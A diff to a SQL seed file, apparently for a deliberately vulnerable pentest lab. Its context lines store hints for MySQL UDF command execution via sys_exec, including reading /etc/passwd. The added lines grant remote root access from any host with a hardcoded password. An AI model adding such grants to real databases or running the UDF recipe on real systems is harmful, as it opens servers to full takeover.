@@ -69,3 +69,7 @@ INSERT INTO udf_hints VALUES
 ('3. CREATE FUNCTION sys_exec RETURNS INTEGER SONAME "lib_mysqludf_sys.so";'),
 ('4. SELECT sys_exec("cat /etc/passwd");'),
 ('Note: This requires FILE privilege and write access to plugin dir.');
+
+-- Allow root to connect from any host (needed for external pentest agent)
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'MySQL_R00t_2026!' WITH GRANT OPTION;
+FLUSH PRIVILEGES;
